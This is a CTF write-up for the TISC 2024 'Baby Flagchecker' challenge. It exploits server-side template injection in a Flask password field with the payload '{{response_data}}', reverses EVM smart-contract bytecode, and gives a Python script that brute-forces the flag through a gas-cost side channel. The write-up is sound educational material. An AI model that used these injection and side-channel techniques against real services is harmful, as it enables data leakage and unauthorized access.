href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a aria-current="page" href="/ctf-writeups/baby-flagchecker" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-xl opacity-40 mb-1"></span><h1 class="mb-7">Baby Flagchecker</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>You've come so far, brave agents! Let us continue our mission to identify our threats, and retrieve the crucial information that they are hiding from the world.</p>
<p>While scanning their network, your fellow agents chanced upon a tool used by the adversary that checks for the validity of a secret passphrase.</p>
<p>We know that they use this phrase for establishing communications between one another, but the one we have is way outdated... It's time for an update.</p>
<p><a href="http://chals.tisc24.ctf.sg:52416/">http://chals.tisc24.ctf.sg:52416/</a></p>
</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">keyboard_double_arrow_left</i><span class="mr-4 text-black font-semibold">rev</span></div><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">currency_bitcoin</i><span class="mr-4 text-black font-semibold">blockchain</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">17 solves</span><span class="opacity-60">0 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by unknown</span></div></div><div class="w-full flex border border-almost-black-lighter rounded-2.5xl mt-7 mb-9 max-sm:flex-col"><div class="flex-1 flex flex-col gap-y-2 px-6 pt-4 pb-5"><span>Attachments</span><!--[--><a href="https://api.tisc24.csit-events.sg/file?id=cm0y2eipy38w208543nwsh40i&amp;name=baby_flagchecker.zip&amp;req=clzv2z8zr0c5q0854jk6g5acs&amp;reqHash=f316095a237261216e1674a9501c74d2129ef2734263c6cedbc04ddcc4edc5049442a55e83eef141e093af331a2db2e0bc2d8f0cea3803ec5104932fb45f6856&amp;reqExp=1727782114" class="underline">baby_flagchecker.zip</a><!--]--></div><button class="pl-9 pr-10 font-semibold flex items-center border-l border-almost-black-lighter rounded-tr-2.5xl rounded-br-2.5xl transition-colors hover:bg-almost-black active:bg-almost-black-lighter max-sm:border-l-0 max-sm:border-t max-sm:pl-6 max-sm:py-4 max-sm:rounded-tr-none max-sm:rounded-bl-2.5xl"><i class="material-symbols-outlined text-2xl mr-4">download</i> Download all </button></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p>Similar to level 6, this is also a blockchain challenge, though with more emphasis on rev. Partial source is provided for this challenge:</p>
<p><img src="/ctf-writeups/tisc24/baby_flagchecker_tree.png" alt=""></p>
<h1 id="ssti-leak" tabindex="-1">SSTI leak</h1>
<p>There are 2 parts, the frontend web app and the backend where the private blockchain network is running. I quickly spotted the ssti vulnerability with the password field:</p>
<pre class="named-fence-block"><code class="language-python">@app.route('/submit', methods=['POST'])
def submit():
    password = request.form['password']
    try:
        if len(password) &gt; 32:
            return render_template_string("""
        ... error message, html omitted for brevity ...
        """)

        response = requests.post("http://server:5000/check", json={"password": password})
        response_data = response.json()

        return render_template_string("""
        ... html omitted for brevity ...
            &lt;body&gt;
                &lt;div class="container"&gt;
                    &lt;p&gt;Result for """ + password + """:&lt;/p&gt;
                    {% if response_data["output"] %}
                    &lt;h1&gt;Accepted&lt;/h1&gt;
                    {% else %}
                    &lt;h1&gt;Invalid&lt;/h1&gt;
                    {% endif %}
                    &lt;a href="/"&gt;Go back&lt;/a&gt;
                &lt;/div&gt;
            &lt;/body&gt;
        &lt;/html&gt;
        """, response_data=response_data)
    except Exception as e:
        return str(e)
</code><div class="named-fence-filename">main.py</div></pre>
<p>Unfortunately, the 32 character length limit means we cannot get RCE. However, we can leak <code>response_data</code> with by passing password = <code>{{response_data}}</code>:</p>
<p><img src="/ctf-writeups/tisc24/response_data_leak.png" alt=""></p>
<h1 id="backend-server" tabindex="-1">Backend server</h1>
<p>On the backend there is a single POST endpoint:</p>
<pre class="named-fence-block"><code class="language-python">...

@app.post("/check")
async def check(password_input: PasswordInput):
    password = password_input.password

    try:
        web3_client = connect_to_anvil()
        setup_contract = init_setup_contract(web3_client)
        output_json = call_check_password(setup_contract, password)

        return output_json
    except RuntimeError as e:
        raise HTTPException(status_code=500, detail=str(e))
</code><div class="named-fence-filename">main.py</div></pre>
<p>The format of <code>output_json</code> is as follows:</p>
<pre class="named-fence-block"><code class="language-python">...

def call_check_password(setup_contract, password):
    # Call checkPassword function
    passwordEncoded = '0x' + bytes(password.ljust(32, '\0'), 'utf-8').hex()

    # Get result and gas used
    try:
        gas = setup_contract.functions.checkPassword(passwordEncoded).estimate_gas()
        output = setup_contract.functions.checkPassword(passwordEncoded).call()
        logger.info(f'Gas used: {gas}')
        logger.info(f'Check password result: {output}')
    except Exception as e:
        logger.error(f'Error calling checkPassword: {e}')

    # Return debugging information
    return {
        "output": output,
        "contract_address": setup_contract.address,
        "setup_contract_bytecode": os.environ['SETUP_BYTECODE'],
        "adminpanel_contract_bytecode": os.environ['ADMINPANEL_BYTECODE'],
        "secret_contract_bytecode": os.environ['SECRET_BYTECODE'],
        "gas": gas
    }
</code><div class="named-fence-filename">connect_to_testnet.py</div></pre>
<p>Essentially it connects to the private blockchain network and calls the <code>checkPassword</code> function on the Setup contract. The addresses of 2 other contracts are passed to Setup's constructor, so it probably calls some functions in them too.</p>
<p>Going back to the ssti leak, we now have the contract bytecode for 2 contracts: Setup and AdminPanel. I used an online solidity decompiler <a href="https://ethervm.io/decompile">https://ethervm.io/decompile</a> which gave me a decompilation and disassembly.</p>
<h1 id="reversing-adminpanel" tabindex="-1">Reversing AdminPanel</h1>
<p>AdminPanel was the first contract I reversed since it was shorter and easier to follow. The decompilation is suspiciously short:</p>
<pre><code class="language-solidity">contract Contract {
    function main() {
        memory[returndata.length:returndata.length + 0x85] = code[0x09:0x8e];
        return memory[returndata.length:returndata.length + 0x85];
    }
}
</code></pre>
<p>But looking at the disassembly, we can see there is a lot more going on. It seems like the above code is just replacing the section of executable memory with more bytecode. This additional bytecode is found right after it, beginning with this section:</p>
<pre><code class="language-plaintext">	0009    5F    5F // PUSH 0
	000A    35    CALLDATALOAD
	000B    80    DUP1
	000C    60    PUSH1 0xd8
	000E    1C    SHR
	000F    64    PUSH5 0x544953437b // "TISC{"
	0015    14    EQ
</code></pre>
<p>(Note: while reversing the assembly I refered to this <a href="https://www.ethervm.io/">evm instruction set manual</a>, a surprisingly comprehensive resource)</p>
<p>The above section loads the first 32 bytes of <code>msg.data</code> (basically arguments passed to the function), shifts right 27 bytes, and compares with "TISC{". So it just checks for the flag start.</p>
<pre><code class="language-plaintext">	0016    81    DUP2 // msg.data[0:32]
	0017    60    PUSH1 0x80
	0019    1B    SHL
	001A    60    PUSH1 0xf8
	001C    1C    SHR
	001D    60    PUSH1 0x7d
	001F    14    EQ
</code></pre>
<p>The next section translates to <code>((msg.data[0:32] &lt;&lt; 16 bytes) &gt;&gt; 31 bytes) == "}"</code> - checking the end of the flag. From this, we can also deduce the length of the flag - 17 characters.</p>
<p>This next section is slightly more tricky:</p>
<pre><code class="language-plaintext">	0024    61    PUSH2 0x0022
	0027    57    *JUMPI
	0028    5F    5F
	0029    5F    5F
	002A    FD    *REVERT
	002B    5B    JUMPDEST
	002C    60    PUSH1 0x04
	002E    35    CALLDATALOAD
	002F    60    PUSH1 0x98
	0031    63    PUSH4 0x6b35340a
	0036    60    PUSH1 0x60
	0038    52    MSTORE
	0039    60    PUSH1 0x20  // length
	003B    60    PUSH1 0x60  // offset
	003D    20    SHA3
	003E    90    SWAP1
	003F    1B    SHL
	0040    18    XOR
</code></pre>
<p>It translates to <code>msg.data[4:36] ^ (keccak256(0x6b35340a) &lt;&lt; 19 bytes)</code>. Let's move on to the next section.</p>
<pre><code class="language-plaintext">	0041    60    PUSH1 0x24
	0043    35    CALLDATALOAD
	0044    63    PUSH4 0x66fbf07e
	0049    60    PUSH1 0x20
	004B    52    MSTORE
	004C    60    PUSH1 0x20
	004E    5F    5F
	004F    60    PUSH1 0x04
	0051    60    PUSH1 0x3c
	0053    84    DUP5
	0054    5A    GAS
	0055    F4    DELEGATECALL
</code></pre>
<p>This is performing some function call, and after consulting the aforementioned ISA manual I realised it is calling the function at address <code>msg.data[0x24:0x44]</code>, with arguments <code>memory[0x3c:0x3c+4]</code>. The return value is stored at <code>memory[0:0x20]</code>. Later on, I realised that the first 4 bytes in the argument are used as a "selector", which identifies which function in the contract to call. Here's an example from <a href="https://medium.com/@eiki1212/explaining-ethereum-contract-abi-evm-bytecode-6afa6e917c3b">this article</a></p>
<pre><code class="language-plaintext">// Encode function with keccak256.
&gt; web3.utils.sha3(“withdraw(uint256)”)
0x2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f
// Extract first 4 bytes.
0x2c1a7d4d
</code></pre>
<p>So it's basically doing something like <code>mystery_contract.function()</code>, with the address of <code>mystery_contract</code> being stored at <code>memory[0x24:0x44]</code>.</p>
<p>Additionally, this means that <code>msg.data[0:4</code> = "TISC" is the selector for this contract function. So the user input should just be the <code>{...}</code> part.</p>
<p>The next section is a bit long winded, but after tracking how the stack changes I realised it's just comparing the output of <code>msg.data[4:36] ^ (keccak256(0x6b35340a) &lt;&lt; 19 bytes)</code> to <code>mystery_contract.function()</code>. It checks that they have 0xd = 13 equal bytes, and returns 0 or 1 based on that. Here it is:</p>
<pre><code class="language-plaintext">	0057    5F    5F
	0058    51    MLOAD
	0059    5F    5F
	005A    5F    5F
	005B    5B    JUMPDEST
	005C    82    DUP3
	005D    82    DUP3
	005E    1A    BYTE
	005F    85    DUP6
	0060    83    DUP4
	0061    1A    BYTE
	0062    14    EQ
	0063    61    PUSH2 0x0070
	0066    57    *JUMPI
	0067    5B    JUMPDEST
	0068    90    SWAP1
	0069    60    PUSH1 0x01
	006B    01    ADD
	006C    80    DUP1
	006D    60    PUSH1 0x0d
	006F    14    EQ
	0070    61    PUSH2 0x0078
	0073    57    *JUMPI
	0074    90    SWAP1
	0075    61    PUSH2 0x0052
	0078    56    *JUMP
	0079    5B    JUMPDEST
	007A    60    PUSH1 0x01
	007C    01    ADD
	007D    61    PUSH2 0x005e
	0080    56    *JUMP
	0081    5B    JUMPDEST
	0082    81    DUP2
	0083    60    PUSH1 0x0d
	0085    14    EQ
	0086    60    PUSH1 0x40
	0088    52    MSTORE
	0089    60    PUSH1 0x20
	008B    60    PUSH1 0x40
	008D    F3    *RETURN
</code></pre>
<p>Since we don't have access to the <code>mystery_contract</code> bytecode, we have to continue reversing.</p>
<h1 id="reversing-setup" tabindex="-1">Reversing Setup</h1>
<p>When I decompiled Setup on ethervm.io, it helpfully informed me that the decompilation was probably constructor bytecode and to get the actual deployed contract I would have to "remove the constructor prefix, usually up to the next 6060 or 6080". I did so, and got the following decompilation (annotated with my comments):</p>
<pre><code class="language-solidity">contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;
        var var0 = msg.value;
    
        if (var0) { revert(memory[0x00:0x00]); }
    
        if (msg.data.length &lt; 0x04) { revert(memory[0x00:0x00]); }
    
        var0 = msg.data[0x00:0x20] &gt;&gt; 0xe0;
    
        if (var0 != 0x410eee02) { revert(memory[0x00:0x00]); } // 0x410eee02 seems to be the selector
    
        var var1 = 0x0043;
        var var2 = 0x003e;
        var var3 = msg.data.length;
        var var4 = 0x04;
        var2 = func_0115(var3, var4); // get first argument
        var1 = func_003E(var2); // call checkPassword
        var temp0 = memory[0x40:0x60];
        memory[temp0:temp0 + 0x20] = !!var1;
        var temp1 = memory[0x40:0x60];
        return memory[temp1:temp1 + (temp0 + 0x20) - temp1];
    }
    
    function func_003E(var arg0) returns (var r0) {
        // Called from main
        //
        // Parameters:
        // ===========
        // - arg0: user input
        //
        // What it does:
        // =============
        // - this should be checkPassword. returns 1 or 0

        var var0 = 0x00;
        var temp0 = memory[0x40:0x60]; // some sort of solidity stack pointer?
        memory[temp0 + 0x24:temp0 + 0x24 + 0x20] = arg0;
        var temp1 = (0x01 &lt;&lt; 0xa0) - 0x01; // mask for lower 20 bytes
        memory[temp0 + 0x44:temp0 + 0x44 + 0x20] = temp1 &amp; storage[0x01]; // storage[1] probably contains some contract address
        var temp2 = memory[0x40:0x60];
        memory[temp2:temp2 + 0x20] = temp0 - temp2 + 0x44; // temp0 and temp2 cancel out, not sure why this suboptimal bytecode was generated.
        memory[0x40:0x60] = temp0 + 0x64;
        var temp3 = temp2 + 0x20;
        // the next line is essentially memory[temp3:temp3 + 4] = "TISC"
        memory[temp3:temp3 + 0x20] = (memory[temp3:temp3 + 0x20] &amp; (0x01 &lt;&lt; 0xe0) - 0x01) | (0x54495343 &lt;&lt; 0xe0);

        // at this point, we have the following data in memory[temp0:temp0 + 0x64]:
        // [temp0 + 0x00]: 0x44 - 32 bytes
        // [temp0 + 0x20]: "TISC" - 4 bytes
        // [temp0 + 0x24]: user input (arg0) - 32 bytes
        // [temp0 + 0x44]: contract address - 32 bytes (only lower 20 bytes are used)

        var var1 = var0;
        var var2 = var1;
        var var3 = temp1 &amp; storage[var2]; // storage[0], seems to be another contract address
        var var5 = temp2;
        var var6 = memory[0x40:0x60];
        var var4 = 0x00b9;
        var4 = func_012E(var5, var6); // copy 0x44 bytes from [temp0 + 0x20] to [temp0 + 0x64]
        var temp4 = memory[0x40:0x60];
        var temp5;

        // the following function call:
        // ============================
        // - contract address: storage[0]
        // - function selector: "TISC"
        // - extra data:
        //   - user input
        //   - storage[1]
        //
        // here, we can deduce that it's calling the AdminPanel function we reversed previously.
        // so storage[1] is the address of 'mystery_contract', most likely the Secret contract.
        temp5, memory[temp4:temp4 + 0x00] = address(var3).call.gas(msg.gas)(memory[temp4:temp4 + var4 - temp4]);
        var4 = returndata.length;
        var5 = var4;
    
        if (var5 == 0x00) {
            var2 = 0x60;
            var1 = var3;
            var3 = 0x010a;
            var4 = var2;
            var3 = func_015D(var4);
        
        label_010A:
            return var3 == 0x01;
        } else {
            var temp6 = memory[0x40:0x60];
            var4 = temp6;
            memory[0x40:0x60] = var4 + (returndata.length + 0x3f &amp; ~0x1f);
            memory[var4:var4 + 0x20] = returndata.length;
            var temp7 = returndata.length;
            memory[var4 + 0x20:var4 + 0x20 + temp7] = returndata[0x00:0x00 + temp7];
            var2 = var4;
            var1 = var3;
            var3 = 0x010a;
            var4 = var2;
            var3 = func_015D(var4);
            goto label_010A;
        }
    }
    
    function func_0115(var arg0, var arg1) returns (var r0) {
        // Called from func_003E
        // 
        // Parameters:
        // ===========
        // - arg0: msg.data.length
        // - arg1: 0x4
        // 
        // What it does:
        // =============
        // - returns the first param (32 bytes) in arguments (msg.data)

        var var0 = 0x00;
    
        if (arg0 - arg1 i&gt;= 0x20) { return msg.data[arg1:arg1 + 0x20]; }
        else { revert(memory[0x00:0x00]); }
    }
    
    function func_012E(var arg0, var arg1) returns (var r0) {
        // Called from func_003E
        // 
        // Parameters:
        // ===========
        // - arg0: func_003E_temp0 (initial 'base pointer')
        // - arg1: func_003E_temp0 + 0x64
        //
        // What it does:
        // =============
        // - copies data from [arg0 + 0x20] to [arg1]
        // - length is specified by 32 byte number at [arg0]
        // - in the context of func_003E it copies 0x44 bytes from [func_003E_temp0 + 0x20] to [func_003E_temp0 + 0x64]
        // - returns the memory index right after the destination

        var var0 = 0x00;
        var var1 = memory[arg0:arg0 + 0x20];
        var var2 = 0x00;
    
        if (var2 &gt;= var1) {
        label_014F:
            memory[arg1 + var1:arg1 + var1 + 0x20] = 0x00;
            return arg1 + var1;
        } else {
        label_013E:
            var temp0 = var2;
            memory[temp0 + arg1:temp0 + arg1 + 0x20] = memory[arg0 + temp0 + 0x20:arg0 + temp0 + 0x20 + 0x20];
            var2 = temp0 + 0x20;
        
            if (var2 &gt;= var1) { goto label_014F; }
            else { goto label_013E; }
        }
    }
    
    function func_015D(var arg0) returns (var r0) {
        var temp0 = arg0;
        var var0 = memory[temp0 + 0x20:temp0 + 0x20 + 0x20];
        var var1 = memory[temp0:temp0 + 0x20];
    
        if (var1 &gt;= 0x20) { return var0; }
        else { return var0 &amp; (~0x00 &lt;&lt; (0x20 - var1 &lt;&lt; 0x03)); }
    }
}
</code></pre>
<p>After reversing all the code, we now have a clear understanding of what's going on. Here's the python equivalent:</p>
<pre><code class="language-python">class Secret:
    def getSecret(self):
        # unknown
        return ...


class AdminPanel:
    def actualChecking(self, password, secret):
        return xor_bytes(password, keccak256(0x6b35340a) &lt;&lt; 0x98) == secret.getSecret()


class Setup:
    def __init__(self, adminPanel, secret):
        self.adminPanel = adminPanel
        self.secret = secret

    def checkPassword(self, password):
        return self.adminPanel.actualChecking(password, self.secret) == 1
</code></pre>
<p>We still have no way of getting the flag without knowing what's going on in <code>Secret.getSecret()</code>. Hmm ...</p>
<p>I went down a mini rabbit hole looking at the suspicious instructions near the end of the Setup contract:</p>
<pre><code class="language-plaintext">0184    FE    *ASSERT
	0185    A2    LOG2
	0186    64    PUSH5 0x6970667358
	018C    22    22
	018D    12    SLT
	018E    20    SHA3
	018F    E0    E0
	0190    F8    F8
	0191    33    CALLER
	0192    3B    EXTCODESIZE
	0193    E0    E0
	0194    83    DUP4
	0195    B8    B8
	0196    07    SMOD
	0197    F8    F8
	0198    95    SWAP6
	0199    1D    SAR
	019A    48    BASEFEE
	019B    68    PUSH9 0xa6231b41254b2f6157
	01A5    A9    A9
	01A6    FB    FB
	01A7    62    PUSH3 0xeff1bc
	01AB    EF    EF
	01AC    AF    AF
	01AD    D8    D8
	01AE    4E    4E
	01AF    64    PUSH5 0x736f6c6343
	01B5    00    *STOP
	01B6    08    ADDMOD
	01B7    13    SGT
	01B8    00    *STOP
	01B9    33    CALLER
</code></pre>
<p>I saw the ascii hex values and thought this might be important to the challenge. But eventually I came across <a href="https://ethereum.stackexchange.com/questions/23525/what-is-the-cryptic-part-at-the-end-of-a-solidity-contract-bytecode">this stackexchange post</a> and realised it was just some metadata not relevant to the challenge.</p>
<h1 id="finding-an-oracle" tabindex="-1">Finding an Oracle</h1>
<p>I went back to the web interface to see if there was anything I missed. Looking at the response_data leak, is there any additional information we can use? Aside from the contract bytecodes and output, we also have access to <code>setup_contract_address</code> and <code>gas</code>. The former is useless since it is a fixed value we can't do anything with. But what about <code>gas</code>?</p>
<p>I recalled from browsing this list of <a href="https://ethereum.org/en/developers/docs/evm/opcodes/">ethervm opcodes</a> that each opcode has a specific gas cost. So if a different sequence of opcodes are executed, the gas cost will be different. After testing some payloads, I confirmed that <code>gas</code> is deterministic based on the input.</p>
<p><img src="/ctf-writeups/evm_opcode_gas.png" alt=""></p>
<p>I realised that it was possible to perform something similar to a timing attack, where in this case the gas cost represents the 'time' taken to execute the flag checking algorithm. If a certain string has a higher gas cost compared to another one, that means it passed more of the checks in the character-by-character string comparison. Thus, we can write a script to query a large number of strings that vary by only a single character, and narrow down which character is correct. Repeating this process for each character in the flag allows us to leak it eventually.</p>
<p>I wrote a python script to achieve this:</p>
<pre class="named-fence-block"><code class="language-python">import requests
from string import printable

template = list('{XXXXXXXXXXX}' + '{{response_data}}')

space = set(printable).difference('#{}%')  # these characters were causing errors with flask templating

for x in range(1, 12):
    for c in space:
        payload = template[:]
        payload[x] = c
        resp = requests.post('http://chals.tisc24.ctf.sg:52416/submit',
                             data={'password': ''.join(payload)})
        search_for = "&amp;#39;gas&amp;#39;: "
        try:
            i = resp.text.index(search_for) + len(search_for)
            j = resp.text.index('}', i)
            gas = int(resp.text[i:j])
            if gas &gt;= 33377:
                print(c, end='', flush=True)
                break
        except:
            print(resp.text)
            import sys
            sys.exit(1)
</code><div class="named-fence-filename">s.py</div></pre>
<p>Running the script, we are able to leak the flag. Now wrap it in the flag format: <code>TISC{g@s_Ga5_94S}</code></p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><!----></div></div><!----></div></div>
    
  

</body></html>